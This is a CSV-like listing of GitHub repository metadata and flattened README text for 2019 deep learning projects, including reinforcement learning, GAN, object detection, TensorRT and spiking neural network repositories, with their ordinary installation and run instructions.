microsoft,pytorch-luxor-lab,pytorch,Solving problems with Deep Learning an in depth example using PyTorch and its ecosystem tutorial lab Contributing This project welcomes contributions and suggestions Most contributions require you to agree to a Contributor License Agreement CLA declaring that you have the right to and actually do grant us the rights to use your contribution For details visit https cla opensource microsoft com When you submit a pull request a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately e g status check comment Simply follow the instructions provided by the bot You will only need to do this once across all repos using our CLA This project has adopted the Microsoft Open Source Code of Conduct https opensource microsoft com codeofconduct For more information see the Code of Conduct FAQ https opensource microsoft com codeofconduct faq or contact opencode microsoft com mailto opencode microsoft com with any additional questions or comments,2019-11-07T19:01:19Z,2019-11-24T08:16:27Z,Python,microsoft,Organization,35,5,4,23,master,kit1980#microsoftopensource#microsoft-github-operations[bot],3,0,1,0,0,0,0
szhhan,Deep-learning-with-both-NLP-and-non-NLP-features,n/a,Deep learning with both NLP and non NLP features Merge Nlp features the documents and Non nlp features real features columns in the dataset into single neural network and predict for question pair similarity 3 different inputs Yields much higher test accuracy than single nlp features non nlp features,2019-11-11T22:32:02Z,2019-11-25T00:02:01Z,Jupyter Notebook,szhhan,User,1,5,0,2,master,szhhan,1,0,0,0,0,0,0
dbaranchuk,nns-meets-deep-rl,n/a,Towards Similarity Graphs Constructed by Deep Reinforcement Learning Code for paper https arxiv org abs 1911 12122 Overview The approach constructs similarity graphs for efficient nearest neighbor search using Reinforcement Learning machinery We formulate the similarity graph construction as Markov Decision Process The environment contains of the initial graph and search algorithm The agent utilizes the search algorithm to walk around the graph and decides what edges to eliminate The agent aims to maximize the expected reward which is optimized by TRPO The training process is highly optimized in order to deal with graphs with millions of edges Toy Example The graph constructed on 100 vectors from the MNIST8x8 dataset The optimization is performed over the complete graph Colors correspond to the MNIST class labels The nodes providing efficient graph navigation hubs are denoted by large sizes Each MNIST class contains up to two hubs Dependecies PyTorch 1 0 0 Python 3 5 Install the libraries required to compile C parts of our framework sudo apt get install gcc g libstdc 6 wget curl unzip git sudo apt get install swig3 0 or just swig Run 1 Clone or download this repo cd yourself to it s root directory 2 Grab or build a working python enviromnent Anaconda https www anaconda com works fine 3 Install packages from requirements txt 4 Open jupyter notebook in notebooks and you re done Reproducibility Final hyperparameters can be found in Appendix Not listed ones are set by default in jupyter notebooks in notebooks All tensorboard logs trained agents and constructed graphs used for final evaluation are here https www dropbox com sh h0onjsyqrvguila AACAd4KU8UZ8GzI1yQCenQDia dl 0 Contact Regarding any questions and problems do not hesitate to contact Dmitry Baranchuk mailto dmitry baranchuk grpahics cs msu or open issues https github com dbaranchuk nns meets deep rl issues,2019-11-26T18:26:58Z,2019-12-09T02:24:56Z,C,dbaranchuk,User,3,5,0,10,master,dbaranchuk,1,0,0,0,0,0,0
GautierDulac,skin-cancer-identification,n/a,skin cancer identification Deep learning class project in November 2019,2019-11-05T13:18:16Z,2019-11-30T22:41:35Z,Jupyter Notebook,GautierDulac,User,1,4,3,274,master,GautierDulac#HenriMatalon#leonardvinc#benjaminsinturel#benblc#annabelleFrin,6,0,0,0,0,0,3
Cambricon,models,n/a,models Provides the MLU models that are converted from open source deep learning network models Note please firstly install git lfs for example on Ubuntu sudo apt get install git lfs git lfs install Note The offline models in this repository are open source neural network models obtained from the Internet which are not optimized by Cambricon If do not meet your accuracy and perfomance requirements contact us to obtain a commercial solution if possible,2019-11-11T05:47:18Z,2019-12-13T09:48:35Z,n/a,Cambricon,Organization,5,4,5,2,master,Lefttyre#zhanglidada,2,0,0,1,0,0,5
zacheberhart,Learning-to-Feel,n/a,Learning to Feel Learning to Feel is a web app using Streamlit that uses deep learning to identify and extract emotions and moods from music With this app you can both explore the data and classify your own songs Check it out here http 167 172 220 53 8501,2019-12-01T18:22:49Z,2019-12-14T22:11:07Z,Python,zacheberhart,User,2,4,3,6,master,zacheberhart,1,0,0,0,0,0,0
MemorialCheng,deep-learning-from-scratch,n/a,deep learning from scratch PythonPDF pdf Star ch01 1 ch02 2 ch08 8 common dataset learningnotes Python 3 x NumPy Matplotlib Python cd ch01 python man py cd ch05 python trainnueralnet py,2019-12-04T13:26:36Z,2019-12-12T08:52:07Z,Python,MemorialCheng,User,2,4,0,33,master,MemorialCheng,1,0,0,0,0,0,0
xunyiljg,AI-Karting--deep-reinforcement-learning-,n/a,AI Karting deep reinforcement learning kart AI that can compete with people bhttps www bilibili com video av76434690 AI86AI86 upAI AIAI AI01 AIAIAI55 AI8654 565560200steam 100up githubAI86 rar https pan baidu com s 1eAzSg1hHtTpmWlAOa4bHuA mx8a AI86 QQ571547846 dadabiubiubiu,2019-11-20T17:04:22Z,2019-11-21T03:24:29Z,n/a,xunyiljg,User,1,4,0,4,master,xunyiljg,1,0,0,0,0,0,0
deep-reinforcement-learning-book,awesome-reinforcement-learning,n/a,Awesome Reinforcement Learning Awesome https awesome re badge svg https awesome re A curated list of awesome Reinforcement Learning resources Inspired by awesome deep vision https github com kjw0612 awesome deep vision awesome adversarial machine learning https github com yenchenlin awesome adversarial machine learning awesome deep learning papers https github com terryum awesome deep learning papers and awesome architecture search https github com markdtw awesome architecture search Reinforcement Learning has become an exciting direction in Computer Vision Machine Learning and Robotics community These are some of the awesome resources Contributing Please help contribute this list by contacting me https zsdonghao github io or add pull request https github com deep reinforcement learning book awesome reinforcement learning pulls 1 Projects Tutorial for Academic Examples in the Book https github com tensorlayer tensorlayer tree master examples reinforcementlearning RLzoo for Industry https github com tensorlayer RLzoo 2 Get Start 2 1 Teaching David Silver Teaching Slices http www0 cs ucl ac uk staff d silver web Teaching html David Sliver Youtube Course Video https www youtube com watch v 2pWv7GOvuf0 list PL7 jPKtc4r78 wCZcQn5IqyuWhBZ8fOxT CMU 10703 Deep RL and Control Slices https katefvision github io Berkeley CS 294 DRL Fall 2017 http rail eecs berkeley edu deeprlcourse Deep Bayes Russia http deepbayes ru Waterloo Reinforcement Learning 2 2 Blog openai baselines ppo https openai com blog openai baselines ppo 3 Paper andrewliao11 Deep Reinforcement Learning Survey https github com andrewliao11 Deep Reinforcement Learning Survey dennybritz deeplearning papernotes https github com dennybritz deeplearning papernotes aikorea awesome rl https github com aikorea awesome rl junhyukoh deep reinforcement learning papers https github com junhyukoh deep reinforcement learning papers muupan deep reinforcement learning papers https github com muupan deep reinforcement learning papers LantaoYu MARL Papers https github com LantaoYu MARL Papers 4 https github com zsdonghao research and coding https morvanzhou github io tutorials machine learning reinforcement learning 6 3 A3C ACA3C https blog csdn net jinzhuojun article details 72851548,2019-11-13T11:02:01Z,2019-12-03T16:32:02Z,n/a,deep-reinforcement-learning-book,Organization,1,4,0,6,master,zsdonghao,1,0,0,0,0,0,0
vsay01,Summary_Note_Udacity_Deep_learning_PyTorch,n/a,SummaryNoteUdacityDeeplearningPyTorch I uploaded all my notes in part of the community notes https drive google com drive folders 1Se9Z9Qog5dOnM3PtvUCa1snLj9wRpzoe usp sharing,2019-12-03T02:49:54Z,2019-12-15T03:51:17Z,n/a,vsay01,User,2,4,1,1,master,vsay01,1,0,0,0,1,0,0
akirasosa,embedded_dl_with_rust,cpp#deep-learning#embedded-systems#jetson#rust#tensorrt,Rust for Embedded Deep Learning Model This project is a starter code for embedded deep learning model with Rust lang https www rust lang org Motivation Though cloud usage is common in most situations it sometimes necessary to run deep learning model in restricted environment such as embedded systems C is the most widely used for embedded system but its productivity is low and it sometimes ships unsafe code Rust can give developers both of performance and safety This repository uses C only for minimal usage which interacts with GPU using TensorRT The rest of codes are all written by Rust It s useful to make an app which uses GPU in embedded system Requirements Rust bindgen https github com rust lang rust bindgen cmake rs https github com alexcrichton cmake rs TensorRT 6 https developer nvidia com tensorrt OpenCV4 Getting Started Download TensorRT 6 from Nvidia page https developer nvidia com tensorrt and install it by following the guide https docs nvidia com deeplearning sdk tensorrt install guide index html installing tar as below tar xzvf TensorRT 6 x x x gnu cuda x x cudnn7 x tar gz ls TensorRT 6 x x x bin data doc graphsurgeon include lib python samples targets TensorRT Release Notes pdf uff export LDLIBRARYPATH LDLIBRARYPATH We use headers and lib in it later So let s set TENSORRTROOT env var export TENSORRTROOT PATH to TensorRT 6 x x x Install OpenCV4 It s supposed to be installed under usr local You will see something like below ls usr local include opencv4 opencv2 opencvversion 4 1 0 Install Rust by following the guide https www rust lang org tools install and confirm it cargo version cargo 1 38 0 23ef9a4ef 2019 08 20 Download pre trained TensorRT serialized model here https www dropbox com s 1uen1ow8e4vap7m retinafaceresnet50trainedopt trt dl 0 and put it in tmp dir under project root ls tmp retinafaceresnet50trainedopt trt This model uses Resnet50 as a backbone which is not so fast It s ready to run cargo run 10 07 2019 17 28 03 I TRT Init Engine from tmp retinafaceresnet50trainedopt trt 10 07 2019 17 28 06 W TRT TensorRT was linked against cuDNN 7 6 3 but loaded cuDNN 7 6 0 10 07 2019 17 28 06 W TRT TensorRT was linked against cuDNN 7 6 3 but loaded cuDNN 7 6 0 10 07 2019 17 28 06 I TRT Engine Destroyed ls tmp out jpg tmp out jpg The output will be something like this result images result jpg,2019-11-13T03:11:19Z,2019-11-25T17:18:54Z,C++,akirasosa,User,1,4,0,6,master,akirasosa,1,0,0,0,0,0,0
git-disl,DLEdge,deep-learning#edge-computing#intel#object-detection#yolov3,Introduction With advances in deep neural networks DNNs there has been a proliferation of revolutionizing products Yet the popularization of such DNN powered applications is hindered because their success is built on intensive computations and powerful GPUs This project aims at accelerating deep neural networks on edge devices using Intel Neural Compute Stick 2 NCS We show that NCS is capable of speeding up the inference time of complicated neural networks which can be efficient enough to run locally on edge devices Such acceleration paves the way to develop ensemble learning on the edge for performance improvement As a motivating example we exploit object detection to be the application and utilize the well known algorithm YOLOv3 Link https pjreddie com darknet yolo as the detector We develop a web based visualization platform to support ensemble object detection Photos and videos from local files or webcam are supported Frame per second FPS is displayed to indicate the speed up made by one or more NCS devices running in parallel The architecture of the system is as below Architecture Diagram media architecture png Demo We provide a video below to demonstrate this project You may run the source code to replicate the demo using NCS devices Make sure you have turned on the Subtitles on YouTube http img youtube com vi qs5oX4c qU 0 jpg http www youtube com watch v qs5oX4c qU Demo Installation This project consists of two components 1 client side for detection visualization and 2 server side hosting the Intel Compute Sticks You should follow the instruction carefully to start each component The following instruction assumes that you have already installed OpenVINO according to the guideline Link https software intel com en us neural compute stick provided by Intel to run NCS on your machine Client The client is a React app The UI allows three types of inputs image video and webcam stream If the input is an image it is converted to a base64 encoded string and sent to server The server decodes the image and runs the detection algorithm on it Server then sends back the prediction results class score and bounding box locations which are then displayed on the UI For video or video stream captured through UI the workflow is same except that in this case each frame of the video is encoded as base64 string and sent to server To run the client follow the below steps cd app npm install npm start The client runs on port 3000 Server The server is a Flask server 1 Install Flask with pip install Flask 2 Setup OpenVINO env as instructed by Intel 3 Run python3 serverparallel py 4 Plugin the device one by one according to the instruction The server supports two APIs 1 POST detectobjects This API is used to send the image data to the server URL http device ip 5000 detectobjects request body json image Base 64 encoded image as a string mode parallel or ensemble models one or more model names as an array The server accepts the request data and immediately responds with 200 response code The data is processed asynchronously and the prediction results are stored in the server until requested by the client 2 GET detectobjectsresponse This API is used to retrieve the prediction results from the server The client repeatedly polls the server with this API until a response is given URL http device ip 5000 detectobjectsresponse models Response with mode parallel Json model1 bbox 1 0 200 200 class person score 0 838 model2 bbox 1 0 200 200 class person score 0 838 model3 bbox 1 0 200 200 class person score 0 838 with mode ensemble Json all bbox 1 0 200 200 class person score 0 838 If you encounter the following message multiple times during the model loading unplug NCS devices wait for a few seconds and reinstall them to the host Failed trying again in 2 second s Supported Environment Apart from the installation of OpenVINO for NCS devices the dependencies of this project have been listed in requirements txt The current version of this project is tested on the following environment Operating System Ubuntu 18 04 3 LTS Python Version Python 3 6 8 Web Browser Firefox Status The object detection models in this repository are ten tiny YOLOv3 trained with the PASCAL VOC dataset having different input resolution This project is developed based on two repositories PINTO0309 OpenVINO YoloV3 https github com PINTO0309 OpenVINO YoloV3 opencv openmodelzoo https github com opencv openmodelzoo Contributors This project is managed and maintained by Ka Ho Chow https khchow com Ka Ho Chow https khchow com Quang Huynh https www linkedin com in hvquang Sonia Mathew Hung Yi Li Yu Lin Chung Contributions are welcomed Please contact Ka Ho Chow https khchow com khchow gatech edu if you have any problem,2019-12-08T22:05:01Z,2019-12-15T02:47:57Z,JavaScript,git-disl,Organization,2,4,2,10,master,khchow-gt,1,0,0,0,0,0,0
Antymon,baselines_tf2,n/a,Baselines TF2 0 Selected Deep RL algorithms using Tensorflow 2 0 s Autograph and tf function which are described as a merger of a priori computational graph definition and eager execution Algorithms were largely ported from Stable Baselines Hill2018 Deep Reinforcement Learning suite with some utils brought over At the moment SAC Haarnoja2018 and DDPG Silver2014 are available Prerequisites Tensorflow 2 0 is needed As of November 2019 this is a default version when pulled through latest pip Examples There are 2 tested SAC hyperparameter configurations in a form of runsac py under the root directory Those are a simple Continuous Lunar Lander environment from OpenAI Gym framework Brockman2016 b more complicated 18 DOF Hexapod robot setup through DART simulation engine Lee2018 Hexapod robot Cully2015 is tasked to walk as far as possible along X axis example recording https drive google com open id 1dsVrjTDdhqWkh40eF1vscetfUyJUlVm 1 To set up Lunar Lander the OpenAI s Gym with Box2D is needed can be found at respective pages helper script for the latter under Linux is provided Solved environment yields reward of 200 and above 2 Setup of a Hexapod is more involved I can publish a Docker Linux container at a request based on repositories mentioned below Generally a reward of under 2 signifies hexapod properly walking TensorBoard charts obtained from the example show that SAC can reach that state in just 2M frames and hyper parameters were not tuned at all SAChexapodtraining https gdurl com VmRT State of the project This a quick proof of concept set up for educational purposes Let me know if this project is useful for you Related repositories docker pydart2hexapodbaselines https gitlab doc ic ac uk sb5817 docker dart gym Docker Merkel2014 file describing hexapod Python setup Would require pip and tensorflow updates to work with this repository gym dartenv https gitlab doc ic ac uk sb5817 dartenv Hexapod setup as a Python based environment within OpenAI Gym Brockman2016 framework pydart2 https gitlab doc ic ac uk sb5817 pydart2 Fork of Pydart2 Ha2016 Python layer over C based DART Lee2018 simulation framework Modified to enable experiments with hexapod References 1 Martin Abadi Paul Barham Jianmin Chen Zhifeng Chen Andy Davis JeffreyDean Matthieu Devin Sanjay Ghemawat Geoffrey Irving Michael Isard et al Tensorflow A system for large scale machine learning In12thUSENIXSym posium on Operating Systems Design and Implementation OSDI16 pages265283 2016 0 Greg Brockman Vicki Cheung Ludwig Pettersson Jonas Schneider John Schulman Jie Tang and Wojciech Zaremba Openai gym arXiv preprintarXiv 1606 01540 2016 0 Antoine Cully Jeff Clune Danesh Tarapore and Jean Baptiste Mouret Robots that can adapt like animals Nature 521 7553 503 2015 0 Sehoon Ha Pydart2 A python binding of DART https github com sehoonha pydart2 2016 0 Tuomas Haarnoja Aurick Zhou Pieter Abbeel and Sergey Levine Soft actor critic Off policy maximum entropy deep reinforcement learning with a stochastic actor arXiv preprint arXiv 1801 01290 2018 0 Tuomas Haarnoja Aurick Zhou Kristian Hartikainen George Tucker Sehoon Ha Jie Tan Vikash Kumar et al Soft actor critic algorithms and applications arXiv preprint arXiv 1812 05905 2018 0 Ashley Hill Antonin Raffin Maximilian Ernestus Adam Gleave Rene Traore Prafulla Dhariwal Christopher Hesse Oleg Klimov Alex Nichol Matthias Plap pert Alec Radford John Schulman Szymon Sidor and Yuhuai Wu Stablebaselines https github com hill a stable baselines 2018 0 Jeongseok Lee Michael Grey Sehoon Ha Tobias Kunz Sumit Jain Yuting Ye Siddhartha Srinivasa Mike Stilman and C Karen Liu Dart Dynamic animation and robotics toolkit The Journal of Open Source Software 3 500 02 2018 0 Dirk Merkel Docker Lightweight Linux containers for consistent development and deployment Linux J 2014 239 March 2014 0 David Silver Guy Lever Nicolas Heess Thomas Degris Daan Wierstra and Martin Riedmiller Deterministic policy gradient algorithms 2014,2019-11-14T07:51:22Z,2019-11-25T16:05:05Z,Python,Antymon,User,1,4,0,50,master,Antymon,1,0,0,0,0,0,0
zacharyaanglin,ProbabilisticDeepLearningTensorFlow,n/a,ProbabilisticDeepLearningTensorFlow Material for ODSC Europe presentation Probabilistic Deep Learning in TensorFlow the why and the how,2019-11-04T14:27:50Z,2019-11-27T12:31:33Z,Jupyter Notebook,zacharyaanglin,User,4,3,7,16,master,zacharyaanglin,1,0,0,0,0,0,0
erikgraf,deepLearning,n/a,,2019-12-10T12:28:11Z,2019-12-10T17:24:06Z,Jupyter Notebook,erikgraf,User,1,3,0,5,master,erikgraf,1,0,0,0,0,0,0
Lornatang,Deep-learning-with-cartoon,n/a,Deep learning with cartoon This is the repository for a project that I am currently working on to verify whether the indicators in the current paper meet my expectations I used the current mainstream four GAN models DCGAN WGAN wgan gp and LSGAN to process the cat data I collected All current models have been made into visual versions and are implemented using Django Objectives Generate images of cats for Generative Adversarial Networks GAN https arvix org pdf 1511 06434 pdf DCGAN https github com lornatang Deep learning with cartoon dcgan py WGAN https github com lornatang Deep learning with cartoon wgan py WGAN GP https github com lornatang Deep learning with cartoon wgangp py LSGAN https github com lornatang Deep learning with cartoon lsgan py Requirement Python 3 7 Pytorch 1 3 Torchvision 0 4 Face dataset https pan baidu com s 1eSifHcA password g5qa Run text git clone https github com lornatang Deep learning with cartoon git cd Deep learning with cats train dcgan 64 x 64 model python3 dcgan py cuda train wgan 64 x 64 model python3 wgan py cuda train wgangp 64 x 64 model python3 wgangp py cuda,2019-11-18T14:42:42Z,2019-11-22T00:08:21Z,Python,Lornatang,User,1,3,0,34,master,Lornatang,1,0,0,0,0,0,0
manjunath5496,22-Selected-Top-Papers-on-Deep-Learning,n/a,Deep Learning in Neural Networks An Overview Salient Object Detection A Discriminative Regional Feature Integration Approach Long term Recurrent Convolutional Networks for Visual Recognition and Description MatConvNet Convolutional Neural Networks for MATLAB Image Super Resolution Using Deep Convolutional Networks Beyond Short Snippets Deep Networks for Video Classification U Net Convolutional Networks for Biomedical Image Segmentation Faster R CNN Towards Real Time Object Detection with Region Proposal Networks Unsupervised Representation Learning with Deep Convolutional Generative Adversarial Networks Inception v4 Inception ResNet and the Impact of Residual Connections on Learning Generative Adversarial Nets Character level Convolutional Networks for Text Classification A Few Useful Things to Know About Machine Learning Conditional Random Fields as Recurrent Neural Networks Deep Learning Face Attributes in the Wild Asynchronous Methods for Deep Reinforcement Learning Human level control through deep reinforcement learning Deep learning TensorFlow A System for Large Scale Machine Learning TensorFlow Large Scale Machine Learning on Heterogeneous Distributed Systems Visual Madlibs Fill in the blank Description Generation and Question Answering Visualizing and Understanding Convolutional Networks,2019-11-05T06:01:30Z,2019-11-05T18:03:39Z,n/a,manjunath5496,User,1,3,0,3,master,manjunath5496,1,0,0,0,0,0,0
MakisKans,Reinforcement_Learning,n/a,,2019-11-15T22:02:03Z,2019-12-04T15:09:23Z,Python,MakisKans,User,1,3,0,6,master,MakisKans,1,0,0,0,0,0,0
aieml,DLNN-Week-02,n/a,DLNN Week 02 In this week we discussed about Feed Forward Type Neural Networks Supervised Deep Learning and Forward Propagation and implemented simple 4 layer Deep FFNN for Iris Flower example Video Links 1 BMW advertisement https www youtube com watch v wNAmxL25Bhk 2 MIT Betty driver activity recognition https www youtube com watch v fCLI6kxFFTE t 85s 3 3brown1blue Introduction to NN with Animation https www youtube com watch v aircAruvnKk list PLZHQObOWTQDNU6R167000DxZCJB 3pi Refer the modified 2 0 FFNN for Iris Flower ipynb code Watch video number 3 which explains NN architecture with animations highly recommended,2019-12-01T18:30:34Z,2019-12-08T03:56:07Z,Jupyter Notebook,aieml,User,2,3,2,2,master,aieml,1,0,0,0,0,0,0
catngocd,PhishingDetection,n/a,We tested two model architectures vanilla neural network with Dense layers and feature extraction convolutional neural network with tokenization of each individual letter padding max pooling The Accuracies we got was Vanilla NN 71 9 CNN 96 2,2019-11-25T01:20:29Z,2019-12-11T19:21:10Z,Python,catngocd,User,1,3,0,33,master,catngocd#tiffanyding#KoyenaPal,3,0,0,0,0,0,0
naomifridman,Unet_Brain_tumor_segmentation,n/a,Braintumorsegmentation BraTS has always been focusing on the evaluation of state of the art methods for the segmentation of brain tumors in multimodal magnetic resonance imaging MRI scans BraTS 2019 utilizes multi institutional pre operative MRI scans and focuses on the segmentation of intrinsically heterogeneous in appearance shape and histology brain tumors namely gliomas https medium com naomi fridman multi class image segmentation a5cc671e647a,2019-11-14T20:54:12Z,2019-12-01T15:42:56Z,Jupyter Notebook,naomifridman,User,1,3,1,6,master,naomifridman,1,0,0,1,0,0,0
Oprishri,Predicting-the-Price-of-Bitcoin-Using-Deep-Learning.,bitcoin#lstm-neural-networks,Predicting the Price of Bitcoin Using Deep Learning It was noted during training that the higher the batch size 200 the worst the prediction on the test set We have used 50 epochs to train out LSTM model with batch size 150 we have also tried 60 70 90 and 100 epochs but we didnt get any significant result We have used 1 3 and 4 LSTM Layers for training our model but best result comes at using 1 LSTM Layer In univariate case the best result will come at at training of LSTM layer with 6 neurons In multivariate case the best result will come at training of LSTM layer with 100 neurons Using deep neural networks has provided us with a better understanding of Bitcoin and LSTM architecture Results using single variable approach univariate MSE on normalised training data is 0 07554651699763121 MSE on normalised testing data is 0 07554651699763121 Results using multivariate approach MSE on normalised training data 0 011512494197501335 MSE on normalised testing data 0 18213032776285212,2019-11-17T19:18:04Z,2019-12-02T17:07:52Z,Jupyter Notebook,Oprishri,User,2,3,1,6,master,Oprishri,1,0,0,0,0,0,0
norse,norse,autograd#deep-learning#gpu#machine-learning#neural-network#pytorch#spiking-neural-networks#tensor,Norse A library to do deep learning https en wikipedia org wiki Deeplearning with spiking neural networks https en wikipedia org wiki Spikingneuralnetwork Test Status https github com norse norse workflows Python 20package badge svg https github com norse norse actions The purpose of this library is to exploit the advantages of bio inspired neural components who are sparse and event driven a fundamental difference from artificial neural networks Norse expands PyTorch https pytorch org with primitives for bio inspired neural components bringing you two advantages a modern and proven infrastructure based on PyTorch and deep learning compatible spiking neural network components Documentation https norse github io norse build html index html Example usage template tasks Norse comes packed with a few example tasks such as MNIST https en wikipedia org wiki MNISTdatabase but is generally meant for use in specific deep learning tasks see below section on long short term spiking neural networks bash python runmnist py Getting Started Norse is a machine learning library that builds on the PyTorch https pytorch org infrastructure While we have a few tasks included it is meant to be used in designing and evaluating experiments involving biologically realistic neural networks This readme explains how to install norse and apply it in your own experiments Installation Note that this guide assumes you are on a terminal friendly environment with access to the pip python and git commands Python version 3 7 is required Installing from PyPi bash pip install norse Installing from source python git clone https github com norse norse cd norse python setup py install The primary dependencies of this project are torch https pytorch org tensorboard https www tensorflow org tensorboard and OpenAI gym https github com openai gym A more comprehensive list of dependencies can be found in requirements txt requirements txt Running examples The directory norse task norse task contains three example experiments serving as short self contained correct examples SSCCE http www sscce org You can execute them by invoking the run py scripts from the base directory To train an MNIST classification network invoke python runmnist py To train a CIFAR classification network invoke python runcifar py To train the cartpole balancing task with Policy gradient invoke python rungym py The default choices of hyperparameters are meant as reasonable starting points Example on using the library Long short term spiking neural networks long short term spiking neural networks from the paper by G Bellec D Salaj A Subramoney R Legenstein and W Maass https arxiv org abs 1803 09574 is one interesting way to apply norse python from norse torch module import LSNNLayer LSNNCell LSNNCell with 2 inputs and 10 outputs layer LSNNLayer LSNNCell 2 10 5 batch size running on CPU state layer initialstate 5 cpu Generate data of shape 5 2 10 data torch zeros 2 5 2 Tuple of output data and layer state output newstate layer forward data state Similar work A number of projects exist that attempts to leverage the strength of bio inspired neural networks however none of them are fully integrated with modern machine learning libraries such as Torch or Tensorflow https www tensorflow org Norse was created for two reasons to 1 apply findings from decades of research in practical settings and to 2 accelerate our own research within bio inspired learning The below list of projects serves to illustrate the state of the art while explaining our own incentives to create and use norse SNN toolbox https snntoolbox readthedocs io en latest guide intro html This toolbox automates the conversion of pre trained analog to spiking neural networks The tool is solely for already trained networks and omits the possibly platform specific training Neuron Simulation Toolkit NEST https nest simulator org NEST constructs and evaluates highly detailed simulations of spiking neural networks This is useful in a medical biological sense but maps poorly to large datasets and deep learning Nengo DL https www nengo ai nengo dl introduction html Nengo is a neuron simulator and Nengo DL is a deep learning network simulator that optimised spike based neural networks based on an approximation method suggested by Hunsberger and Eliasmith 2016 https arxiv org abs 1611 05141 This approach maps to but does not build on the deep learning framework Tensorflow which is fundamentally different from incorporating the spiking constructs into the framework itself Contributing Please refer to the contributing md contributing md Credits Norse is created by Christian Pehle https www kip uni heidelberg de people 10110 GitHub cpehle https github com cpehle doctoral student at University of Heidelberg Germany Jens E Pedersen https www kth se profile jeped GitHub jegp https github com jegp doctoral student at KTH Royal Institute of Technology Sweden License LGPLv3 See LICENSE LICENSE for license details,2019-11-22T00:00:15Z,2019-11-29T23:22:36Z,Python,norse,Organization,2,3,0,45,master,cpehle#Jegp#muffgaga,3,0,0,0,1,0,1
shivam1423,Pest_detection,n/a,Pestdetection Pest Detection using Deep Learning and Tensorflow from scratch How to Run Easy way run this Colab Notebook Pest Dataset Download Training Dataset from given Link https drive google com file d 1H1pfNghWOKALC97GpumriOSwt3xsTI view usp sharing Test Dataset is in Pestval zip Inputs 1 Convert the annotations and images from the train dataset into tfrecord 2 Upload labelmap pbtx file in colab How to run inference on frozen TensorFlow graph Requirements 1 frozeninferencegraph pb Frozen TensorFlow object detection model downloaded from Colab after training 2 labelmap pbtxt File used to map correct name for predicted class index downloaded from Colab after training,2019-11-29T14:51:50Z,2019-12-01T11:55:35Z,Jupyter Notebook,shivam1423,User,1,3,0,13,master,shivam1423,1,0,0,0,0,0,0
garyyjn,PokeTaipu,n/a,PokeTaipu Final Project for EECS 600 Deep Learning CWRU typeList Fire Water Grass Eletric Psychic Steel Normal Fairy Dark Flying Ghost Poison Ice Ground Rock Dragon Fighting Bug Datasets https www kaggle com thedagger pokemon generation one 2fd28e699b7c4208acd1637fbad5df2d jpeg https www kaggle com brkurzawa original 150 pokemon image search results https www kaggle com abcsds pokemon Training TO DO Data cleaning x generate RGB matrixes for image assign type to each image Write scripts that convert both JPG and PNG to numpy arrays sized 224 224 3 Generate data matrixes labels of various sizes Model Building Build a shallow 2 layer conv model Webfront TO DO,2019-11-08T03:30:18Z,2019-12-14T21:51:05Z,Jupyter Notebook,garyyjn,User,1,3,0,31,master,garyyjn#rolora,2,0,0,0,0,0,0
HaiShaw,lanes_detection_objects_fusion,n/a,lanesdetectionobjectsfusion Lanes detection Deep Learning Objects detection and Object Lane fusion Lane detection uses Deep Learning vs CV methods by default Lanenet DL detection model Use polyfit 2 by default Curvature CenterDeviation Heading Angle Error Objects detection uses autoware ai perception methods by default DetectedObjectArray Object Label Distance Vector Velocity Vector TODO Object Lane fusion Detected Objects to lanes relative to ego lane Register lane id according to ADAS map and localization TODO GNSS and Visual Cue Software configuration Host Ubuntu 16 04 18 04 LTS Docker CE 19 03 gpus all or 18 09 runtime nvidia CUDA Ubuntu 16 04 xenial 10 0 Driver 410 48 Ubuntu 18 04 bionic 10 1 Driver 418 87 CuDNN 7 6 x OpenCV 4 0 0 3 4 CUDA enabled TensorFlow tensorflow gpu 1 13 1 Python 2 7 16 Autoware 1 12 ROS melodic CARLA 0 9 5 Performance i7 8750H CPU 2 20GHz 1 GTX1070 MaxQ 32GB RAM 10 15 FPS overall 800x600 Object detections DLCV LiDAR Lane detections Lane fitting Lane fusion Future Improvement Photo geometry Radar support 2 DetectedObject Spline etc advanced fittings Stereo Monostereo OFlow vision Localization GNSS Vision ADAS MAP Add Qualcomm SNPE DLC TensorRT optimization Disclaimer Work is compiled together with OSS and reinvented code free of use Contribution and improvement is encouraged,2019-11-06T17:03:21Z,2019-11-08T02:18:29Z,Python,HaiShaw,User,1,3,0,5,master,HaiShaw,1,0,0,0,0,1,1
xiangni,DREAM,n/a,DREAM Deep reinforcement learning for REsource Allocation in streaM processing AAAI20 Generalizable Resource Allocation in Stream Processing via Deep Reinforcement Learning Arxiv link,2019-11-19T02:15:07Z,2019-12-11T01:43:49Z,Python,xiangni,User,3,3,0,1,master,xiangni,1,0,0,0,0,0,0
sebashc3712,sentiment_analysis_with_recurrent_networks,n/a,,2019-11-11T15:23:23Z,2019-11-14T19:04:57Z,Jupyter Notebook,sebashc3712,User,1,3,0,3,master,sebashc3712,1,0,0,0,0,0,0
quangkhoi1228,traffic_sign_recognize,deep-learning#traffic-sign-classification#traffic-sign-recognition,trafficsignrecognize n nhn din bin bo cm n trong nh mi trng c s dng deep learning Yu cu Python python 3 6 9 Packages Khuyn khch s dng Anaconda 3 to mt environment mi tn opencv ci tt c packages nh hnh numpy 1 17 2 matplotlib 3 1 1 opencv 3 4 2 django 2 2 5 scikit image 0 15 0 tensorflow 2 0 0 tensorflow mkl 1 15 0 keras 2 2 4 pillow 6 2 1 Run project Activate bin mi trng Anaconda 3 source ospath anaconda3 anaconda3 bin activate Activate mi trng cha cc packages cn thit conda activate opencv Di chuyn n th mc cha project cd parentProjectPath trafficsignrecognize master Chy server python manage py runserver Sau khi chy server thnh cng truy cp a ch localhost 8000 thao tc H tr cc bin bo Theo b bin bo chun Vit Nam 101 ng cm 102 Cm i ngc chiu 122 Dng li 127 Tc ti a cho php Tham kho source code train file model h5 ti github com quangkhoiuit98 trainmodeltrafficsignrecognize Chc nng chnh Trang ch nbsp nbsp nbsp nbsp nbsp nbspNhn din bin bo t nh mi trng Trang tra cu bin bo nbsp nbsp nbsp nbsp nbsp nbspTra cu bin bo t d liu ca ng dng,2019-11-04T11:48:52Z,2019-12-03T01:22:01Z,JavaScript,quangkhoi1228,User,1,3,0,24,master,quangkhoiuit98#quangkhoi1228,2,0,0,0,0,0,0
